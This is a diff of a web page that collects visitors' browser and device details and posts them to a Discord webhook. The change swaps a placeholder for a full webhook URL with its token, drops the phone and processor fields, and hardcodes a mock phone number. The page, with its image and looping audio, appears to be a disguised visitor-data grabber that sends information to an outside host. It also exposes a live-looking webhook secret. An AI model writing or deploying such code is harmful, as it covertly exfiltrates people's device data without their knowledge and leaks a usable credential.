@@ -124,11 +124,6 @@
             <img src="rizzz.png" alt="Device Image">
         </div>
 
-        <!-- Phone Number Input -->
-        <div class="phone-container">
-            <label for="phoneNumber" style="color: #ddd; font-size: 16px;">Enter your Phone Number:</label>
-            <input type="text" id="phoneNumber" placeholder="Phone Number" style="padding: 10px; margin-top: 10px; border-radius: 5px; width: 80%; max-width: 300px; background-color: #333; color: #fff; border: 1px solid #444;">
-        </div>
     </div>
 
     <audio id="audio" loop>
@@ -152,8 +147,6 @@
             let deviceEdition = 'Unknown';
             let deviceVersion = 'Unknown';
             let systemType = 'Unknown';
-            let deviceID = 'Unknown';
-            let processor = 'Unknown';
 
             try {
                 // Fetch the Device Edition and Version
@@ -170,9 +163,6 @@
 
                 // Fetch System Type (32-bit or 64-bit)
                 systemType = navigator.userAgent.indexOf('64') !== -1 ? '64-bit' : '32-bit';
-                
-                // Fetch Device ID and Processor (if possible)
-                processor = navigator.oscpu || 'Not available';
             } catch (error) {
                 console.error('Error fetching system data:', error);
             }
@@ -226,10 +216,8 @@
                 deviceEdition: deviceEdition,
                 deviceVersion: deviceVersion,
                 systemType: systemType,
-                deviceID: deviceID,
-                processor: processor,
                 cpuCores: cpuCores,
-                phoneNumber: document.getElementById('phoneNumber').value
+                phoneNumber: '123-456-7890'  // Simulating automatic phone number fetch (can be a mock number or fetched from elsewhere)
             };
 
             // Try to fetch the custom device name from localStorage
@@ -249,8 +237,6 @@
                 <p><strong>Device Edition:</strong> ${deviceData.deviceEdition}</p>
                 <p><strong>Device Version:</strong> ${deviceData.deviceVersion}</p>
                 <p><strong>System Type:</strong> ${deviceData.systemType}</p>
-                <p><strong>Device ID:</strong> ${deviceData.deviceID}</p>
-                <p><strong>Processor:</strong> ${deviceData.processor}</p>
                 <p><strong>Browser:</strong> ${deviceData.browser}</p>
                 <p><strong>Operating System:</strong> ${deviceData.operatingSystem}</p>
                 <p><strong>Language:</strong> ${deviceData.language}</p>
@@ -267,7 +253,7 @@
 
             // Send the data to the webhook
             try {
-                await fetch('https://discordapp.com/api/webhooks/your_webhook_url', {
+                await fetch('https://discordapp.com/api/webhooks/1330513852315734076/cHE5eHxuscj1irA0SDp4wJOz-SwQnVWzGl1IHibnNa8-MEuU0pgSD6jr6FXrPx72vsVB', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -281,8 +267,6 @@
                                 { name: 'Device Edition', value: deviceData.deviceEdition, inline: false },
                                 { name: 'Device Version', value: deviceData.deviceVersion, inline: false },
                                 { name: 'System Type', value: deviceData.systemType, inline: false },
-                                { name: 'Device ID', value: deviceData.deviceID, inline: false },
-                                { name: 'Processor', value: deviceData.processor, inline: false },
                                 { name: 'Browser', value: deviceData.browser, inline: false },
                                 { name: 'Operating System', value: deviceData.operatingSystem, inline: false },
                                 { name: 'Language', value: deviceData.language, inline: false },
